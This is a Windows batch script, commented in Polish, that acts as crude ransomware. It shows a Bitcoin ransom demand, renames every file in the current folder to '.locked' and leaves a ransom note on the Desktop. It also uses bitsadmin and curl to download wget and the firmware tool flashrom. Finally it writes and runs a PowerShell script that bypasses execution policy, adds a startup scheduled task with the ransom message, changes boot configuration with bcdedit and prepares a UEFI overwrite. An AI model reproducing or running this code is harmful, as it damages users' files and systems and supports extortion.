@echo off
:: Sprawdzenie, czy skrypt działa jako administrator
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :admin
) else (
    title Error
    color 0a
    echo Run as administrator...
    pause
    exit
)

:admin
title Bricked
color 0c
echo Your files have been encrypted. To decrypt pay 00.10btc to this wallet: GvfUFCY5gvJRDt .
echo Don't try to reset bozo...
timeout /t 10 /nobreak >nul

:: Symulacja szyfrowania plików (zmiana nazwy plików na .locked i tworzenie kopii)
echo Simulating file encryption...
for %%F in (*.*) do (
    if not "%%F"=="ransom.bat" (
        ren "%%F" "%%F.locked"
        echo Encrypted > "%%F.locked.txt"
    )
)

:: Tworzenie pliku z instrukcjami na pulpicie
echo Your files are encrypted. Pay 0.10 BTC to GvfUFCY5gvJRDt to decrypt. > %userprofile%\Desktop\README.txt

:: Sprawdzenie połączenia internetowego do pobrania narzędzi
echo Checking internet connection for tool download...
ping google.com -n 1 >nul
if errorlevel 1 (
    echo No internet connection. Cannot download required tools. Falling back to manual preparation.
    goto :manualprep
)

:: Przygotowanie do pobrania narzędzi w systemie Windows (flashrom nie jest natywnie wspierany, więc próbujemy alternatywy)
echo Downloading required tools for firmware access...
mkdir %temp%\ransom_tools
cd %temp%\ransom_tools

:: Pobranie wget lub curl do Windows, jeśli nie istnieje (curl jest wbudowany w nowsze Windows)
echo Attempting to use curl for downloading tools...
curl --version >nul 2>&1
if errorlevel 1 (
    echo Curl not found. Attempting to download wget...
    bitsadmin /transfer wgetDownload /download /priority high https://eternallybored.org/misc/wget/1.21.4/64/wget.exe %temp%\ransom_tools\wget.exe
    set "downloader=%temp%\ransom_tools\wget.exe"
) else (
    set "downloader=curl"
)

:: Pobranie flashrom lub podobnego narzędzia (Windows ma ograniczenia, więc pobieramy port lub instrukcję)
echo Downloading flashrom or alternative firmware tool...
if "%downloader%"=="curl" (
    curl -L -o flashrom.zip https://download.flashrom.org/releases/flashrom-v1.2.zip
) else (
    %downloader% -O flashrom.zip https://download.flashrom.org/releases/flashrom-v1.2.zip
)

:: Rozpakowanie flashrom, jeśli pobrano (Windows nie ma natywnego unzip, więc symulujemy instrukcję)
echo Extracting tools... (Manual extraction may be required)
echo If extraction fails, unzip flashrom.zip manually in %temp%\ransom_tools
echo Attempting to extract using PowerShell...
powershell.exe -Command "Expand-Archive -Path '%temp%\ransom_tools\flashrom.zip' -DestinationPath '%temp%\ransom_tools\flashrom' -Force"

:: Przygotowanie skryptu PowerShell dynamicznie do modyfikacji środowiska startowego i użycia flashrom
:manualprep
echo Preparing PowerShell script for system boot modification and firmware flash...
(
echo $payload = "This computer have been ransomwared pay 1 btc to GvfUFCY5gvJRDt to unlock your files."
echo Write-Output "Attempting to prepare ransom message for boot time..."
echo if (Test-Path "C:\Windows\System32\fwupd.exe") {
echo     Write-Output "Firmware update tool detected. Preparing payload for potential UEFI overwrite."
echo     Add-Content -Path "$env:TEMP\uefi_payload.log" -Value "Payload: $payload"
echo } elseif (Test-Path "$env:TEMP\ransom_tools\flashrom\flashrom.exe") {
echo     Write-Output "Flashrom detected. Attempting to prepare for UEFI flash..."
echo     Add-Content -Path "$env:TEMP\uefi_flash_attempt.log" -Value "Flashrom ready. Run manually with admin rights: flashrom.exe -w custom_firmware.bin"
echo     Add-Content -Path "$env:TEMP\uefi_flash_attempt.log" -Value "Payload to inject: $payload"
echo } else {
echo     Write-Output "No firmware tools found. Download flashrom manually or use manufacturer tools."
echo }
echo Write-Output "Creating boot-time message as UEFI alternative..."
echo $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c echo $payload ^& pause"
echo $trigger = New-ScheduledTaskTrigger -AtStartup
echo Register-ScheduledTask -TaskName "RansomBootMessage" -Action $action -Trigger $trigger -RunLevel Highest -Force
echo Write-Output "Attempting to modify Boot Configuration Data for ransom message (requires bcdedit)..."
echo Invoke-Expression -Command "bcdedit /set {default} bootstatuspolicy ignoreallfailures"
echo Write-Output "Boot environment modified where possible."
) > %temp%\ransom_dynamic.ps1

:: Uruchomienie dynamicznie utworzonego skryptu PowerShell
echo Executing PowerShell script for boot modification...
powershell.exe -ExecutionPolicy Bypass -File %temp%\ransom_dynamic.ps1

:: Komunikat o "sukcesie"
echo Boot modification or UEFI flash preparation completed.
echo Ransom message will display on system reboot.
echo If flashrom is downloaded, run it manually for UEFI overwrite following logs in %temp%\uefi_flash_attempt.log
pause
